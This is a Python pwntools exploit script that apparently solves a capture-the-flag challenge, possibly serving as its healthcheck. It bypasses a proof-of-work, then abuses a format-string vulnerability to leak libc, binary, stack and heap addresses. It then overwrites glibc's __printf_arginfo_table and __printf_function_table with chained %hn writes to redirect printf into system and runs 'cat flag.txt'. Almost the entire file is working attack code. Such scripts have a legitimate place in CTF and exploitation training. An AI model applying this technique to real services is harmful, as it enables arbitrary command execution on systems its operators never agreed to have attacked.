#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes
from pwn import *

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)

print(r.recvuntil('== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)

conn = r
context.binary = elf = ELF("/home/user/vuln")
libc = ELF("/home/user/libc-2.31.so")

conn.sendline(b"%56c%30$hhn")
conn.sendline(b"%17$p%9$p")
conn.recvuntil(b"0x")
libc.address = int(conn.recv(12),16) - libc.sym.__libc_start_main - 243
info("libc @ " + hex(libc.address))
conn.recvuntil(b"0x")
elf.address = int(conn.recv(12),16) - elf.sym.vuln - 180
info("elf @ " + hex(elf.address))

conn.sendline(b"%6$p%7$p")
conn.recvuntil(b"0x")
stack = int(conn.recv(12),16)
info("stack @ " + hex(stack))
conn.recvuntil(b"0x")
heap = int(conn.recv(12),16)
info("heap @ " + hex(heap))

ptr_l = (stack+0x48)%(256**2)
printf_arginfo_table = libc.address + 0x1ed7b0
printf_function_table = libc.address + 0x1f1318

# 6 --> 14
conn.sendline(f"%{ptr_l+2-4}c%c%c%c%c%hn%{(printf_arginfo_table>>16)%(256**2)-ptr_l-2+256**2}c%14$hn|".encode())
conn.recvuntil(b"|")

# 16 --> 20 --> ptr
conn.sendline(f"%{ptr_l-14}c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%hn%{((printf_arginfo_table))%(256**2)-ptr_l+256**2}c%20$hn|".encode())
conn.recvuntil(b"|")

heap -= 0x100

# 41 --> __printf_arginfo_table
conn.sendline(f"%{heap%(256**2)}c%41$hn|".encode())
conn.recvuntil(b"|")

# 32 --> 47 --> __printf_arginfo_table+2
conn.sendline((f"%{(printf_arginfo_table+2)%(256**2)-30}c" + "%c"*30 + f"%hhn%{(heap>>16)%(256**2)-(printf_arginfo_table+2)%(256**2)+256**2}c%47$hn|").encode())
conn.recvuntil(b"|")

# 38 --> 53 --> __printf_arginfo_table+4
conn.sendline((f"%{(printf_arginfo_table+4)%(256**2)-36}c" + "%c"*36 + f"%hhn%{(heap>>32)%(256**2)-(printf_arginfo_table+4)%(256**2)+256**2}c%53$hn|").encode())
conn.recvuntil(b"|")

# 40 --> 44 --> 59 --> __printf_function_table (soon)
conn.sendline((f"%{(ptr_l+2)%(256**2)-38}c" + "%c"*38 + f"%hhn%{(printf_function_table>>16)%(256**2)-ptr_l-2+256**2}c%44$hn|").encode())
conn.recvuntil(b"|")

# 46 --> 50 --> 65 --> __printf_function_table
conn.sendline((f"%{(ptr_l)%(256**2)-44}c" + "%c"*44 + f"%hhn%{(printf_function_table)%(256**2)-ptr_l+256**2}c%50$hn|").encode())
conn.recvuntil(b"|")

# 71 --> __printf_function_table
conn.sendline(f"%c%71$n|".encode())
conn.recvuntil(b"|")

conn.sendline(b"%.26739!" + p64(libc.sym.system)*0x10)

conn.recvline()
conn.recvline()
conn.sendline(b"cat flag.txt")

if b"idek" in conn.recvline():
  exit(0)
exit(1)
